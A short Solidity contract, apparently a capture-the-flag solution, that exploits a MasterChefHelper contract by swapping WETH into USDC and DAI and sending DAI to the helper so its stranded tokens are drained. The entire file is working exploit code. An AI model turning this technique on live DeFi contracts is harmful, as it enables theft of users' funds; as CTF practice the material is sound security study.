pragma solidity ^0.8.13;


import "./MasterChefHelper.sol";
import "./Setup.sol";
import "./UniswapV2Like.sol";

contract RescueAttacker {

    WETH9 weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    ERC20Like usdc = ERC20Like(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ERC20Like dai = ERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    MasterChefHelper public mcHelper;

    receive() external payable {
        // React to receiving ether
    }
    function exploit() public {
        weth.deposit{value: 4900 ether}();

        Setup setup = Setup(0xfC7355Bb2469E4bDC9C5840141f98A9Db298d684);
        mcHelper = setup.mcHelper();
        UniswapV2RouterLike router = mcHelper.router();
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(usdc);
        address[] memory path1 = new address[](2);
        path1[0] = address(weth);
        path1[1] = address(dai);

        weth.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokens(3 ether, 0, path, address(this), block.timestamp);
        router.swapExactTokensForTokens(2000 ether, 0, path1, address(this), block.timestamp*2);
        dai.transfer(address(mcHelper), dai.balanceOf(address(this)));
        usdc.approve(address(mcHelper), type(uint256).max);
        mcHelper.swapTokenForPoolToken(2, address(usdc), usdc.balanceOf(address(this)), 0);

    }
}